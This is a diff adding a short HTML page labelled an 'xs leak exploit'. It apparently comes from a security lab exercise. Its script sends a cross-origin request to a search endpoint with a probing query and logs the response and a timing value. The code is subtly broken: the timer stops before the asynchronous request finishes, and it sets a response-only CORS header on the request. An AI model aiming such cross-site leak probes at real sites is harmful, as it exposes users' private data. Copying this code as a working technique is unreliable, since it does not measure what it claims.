@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>XS LEAK</title>
+    <script type="text/javascript"></script>
+  </head>
+  <body>
+    <h1>xs leak exploit</h1>
+    <script type="text/javascript">
+      const t0 = performance.now();
+
+      var xhr = new XMLHttpRequest();
+      const URL = "https://ptl-d6a4d3a7-93053bd9.libcurl.so/search?search=^c";
+      xhr.open("GET", URL, true);
+      xhr.setRequestHeader("Access-Control-Allow-Origin", "*");
+      xhr.send();
+      xhr.onload = () => {
+          const data = xhr.response;
+          console.log(data);
+      };
+
+      const t1 = performance.now();
+      console.log(`it took: ${t1-t0}`);
+
+    </script>
+  </body>
+</html>
